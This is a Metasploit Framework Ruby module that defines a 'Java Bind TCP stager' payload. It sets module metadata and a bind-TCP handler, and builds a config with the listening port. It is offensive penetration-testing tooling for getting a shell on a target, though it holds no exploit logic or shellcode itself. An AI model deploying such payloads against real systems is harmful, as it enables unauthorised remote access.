##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Java

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Java Bind TCP stager',
			'Version'       => '$Revision$',
			'Description'   => 'Listen for a connection',
			'Author'        => [
					'mihi',  # all the hard work
					'egypt', # msf integration
				],
			'License'       => MSF_LICENSE,
			'Platform'      => 'java',
			'Arch'          => ARCH_JAVA,
			'Handler'       => Msf::Handler::BindTcp,
			'Stager'        => {'Payload' => ""}
			))
		@class_files = [ ]
	end

	def config
		c =  ""
		#config << "Spawn=2\n"
		c << "LPORT=#{datastore["LPORT"]}\n" if datastore["LPORT"]

		c
	end

end

